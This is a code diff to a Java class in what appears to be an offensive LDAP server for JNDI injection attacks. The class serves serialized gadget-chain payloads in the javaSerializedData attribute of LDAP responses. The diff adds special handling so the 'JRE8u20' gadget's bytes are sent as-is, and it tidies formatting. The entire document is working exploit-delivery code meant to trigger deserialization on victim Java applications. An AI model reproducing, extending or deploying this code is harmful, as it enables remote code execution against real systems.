@@ -27,7 +27,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
 public class SerializedDataController implements LdapController {
-    private              String      gadgetType;
+    public static        String      gadgetType;
     private              PayloadType payloadType;
     private              String[]    params;
     public static        CommandLine cmdLine;
@@ -45,6 +45,8 @@ public class SerializedDataController implements LdapController {
         System.out.println(ansi().render("@|green [+]|@Send LDAP result for" + base + " with javaSerializedData attribute"));
         Entry e = new Entry(base);
 
+        byte[] bytes;
+
         try {
             // 获取与载荷类型相关的有效负载类
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
@@ -53,8 +55,12 @@ public class SerializedDataController implements LdapController {
             // 获取有效负载的对象
             Object object = payload.getObject(payloadType, params);
 
-            ByteArrayOutputStream out   = new ByteArrayOutputStream();
-            byte[]                bytes = Serializer.serialize(object, out);
+            if (SerializedDataController.gadgetType.equals("JRE8u20")) {
+                bytes = (byte[]) object;
+            } else {
+                ByteArrayOutputStream out = new ByteArrayOutputStream();
+                bytes = Serializer.serialize(object, out);
+            }
 
             // 设置Java类名属性和Java序列化数据属性，并将搜索条目发送至结果中
             e.addAttribute("javaClassName", "foo");
@@ -79,7 +85,7 @@ public class SerializedDataController implements LdapController {
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
         try {
-            base = base.replace('\\','/');
+            base = base.replace('\\', '/');
             // 获取第一个斜杠的索引
             int firstIndex = base.indexOf("/");
             // 获取第二个斜杠的索引
